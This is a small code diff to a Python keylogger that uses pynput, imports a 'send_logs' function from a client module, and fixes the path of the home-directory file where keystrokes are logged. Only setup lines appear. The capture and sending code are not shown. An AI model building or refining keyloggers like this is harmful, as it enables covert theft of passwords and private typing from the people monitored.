@@ -2,9 +2,10 @@
 import logging
 from pynput import keyboard
 from client import send_logs
+import os
 
 # Path to directory for storing keylogs - User home (~) directory
-log_dir = "~/"
+log_dir =os.path.expanduser("~/")
 
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
 
